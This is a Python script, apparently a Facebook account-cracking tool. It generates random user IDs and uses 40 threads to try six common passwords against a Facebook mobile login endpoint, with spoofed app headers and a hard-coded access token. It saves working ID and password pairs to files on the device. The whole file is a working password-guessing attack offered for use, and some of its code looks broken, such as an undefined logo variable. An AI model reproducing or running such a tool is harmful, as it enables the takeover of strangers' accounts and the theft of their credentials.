#!/usr/bin/python3
#============{IMPORT}============#
import os,time,random,json,sys,zlib
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as sexy
#============{LINEX}============#
def linex():print(f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#============{UPDATE}============#
sisa = '[FBAN/FBIOS;FBAV/444.0.0.29.113;FBBV/546116613;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/17.1.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/547356530]'
#============{MAIN}============#
def main():
    user=[]
    os.system("clear")
    print(logo)
    limit=input(" CRACK LIMIT >>> ")

    os.system('clear')
    print(logo)
    print(" 1 >>> OLD CLONE")
    print(" 2 >>> EXIT......!")
    linex()
    ask=input("[π] SELECT >>> ")
    if ask in["1"]:
        sex="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        exit()
    
    with sexy(max_workers=40) as sisa:
        os.system('clear')
        print(logo)
        for mal in user:
            uid=sex+mal
            sisa.submit(login,uid)
#============{LOGIN-DEF}============#
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r CRACKING >>> {loop} OK >>> {len(oks)}")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","1234567890"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": sisa, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r OK >>> {uid} | {pw}")
                open("/sdcard/SISA-OK-ID.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r CP >>> {uid} | {pw}")
                open("/sdcard/SISA-CP-ID.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r CM >>> {uid} | {pw}")
                open("/sdcard/SISA-CM-ID.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass

#============{END-CODE}============#
main()
